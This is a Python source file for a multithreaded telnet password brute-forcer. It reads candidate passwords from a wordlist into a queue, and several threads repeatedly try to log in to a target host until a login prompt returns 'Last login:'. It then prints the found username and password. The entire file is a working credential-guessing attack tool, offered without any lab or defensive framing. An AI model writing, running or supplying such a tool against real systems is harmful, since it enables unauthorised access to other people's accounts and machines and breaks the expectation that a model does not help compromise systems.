import threading
import queue
import telnetlib


class TelnetTarget:
    def __init__(self, host, port, login, wordlist, queue_size):
        self.host = host
        self.port = port
        self.login = login
        self.wordlist = wordlist
        self.passwords = queue.Queue(queue_size)

    def queue_empty(self):
        return self.passwords.empty()

    def queue_full(self):
        return self.passwords.full()

    def queue_fill(self, file):
        while not self.queue_full():
            password = file.readline().rstrip()
            if len(password) == 0:
                return False
            else:
                self.passwords.put(password)
        return True


class TelnetAttacker(threading.Thread):
    finish = False
    password = ""
    success = False

    def __init__(self, target: TelnetTarget):
        self.target = target
        self.tries = 0
        threading.Thread.__init__(self)

    def get_password(self):
        try:
            password = self.target.passwords.get(block=False)
            return password
        except queue.Empty:
            return None

    def run(self):
        while TelnetAttacker.finish is False:
            try:
                tn = telnetlib.Telnet()
                tn.open(self.target.host, self.target.port)
            except ConnectionRefusedError:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
            else:
                while TelnetAttacker.finish is False:
                    password = self.get_password()
                    if password is None:
                        continue

                    try:
                        tn.read_until(b"login: ")
                        tn.write(self.target.login.encode('ascii') + b"\n")
                        tn.read_until(b"Password: ")
                        tn.write(password.encode('ascii') + b"\n")
                        result = tn.expect([b"Last login:"], 2)
                    except (EOFError, OSError):
                        print("[%s] Connection error - %s" % (self.name, self.target.host))
                        self.target.passwords.put(password)
                        break
                    else:
                        self.tries += 1
                        if result[0] == -1:
                            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                                  (self.name, self.target.host, self.target.login, password))
                        else:
                            TelnetAttacker.finish = True
                            TelnetAttacker.password = password
                            TelnetAttacker.success = True
                            print("[%s] Found credentials for %s - user: %s, password: %s" %
                                  (self.name, self.target.host, self.target.login, password))
                            break
            finally:
                tn.close()
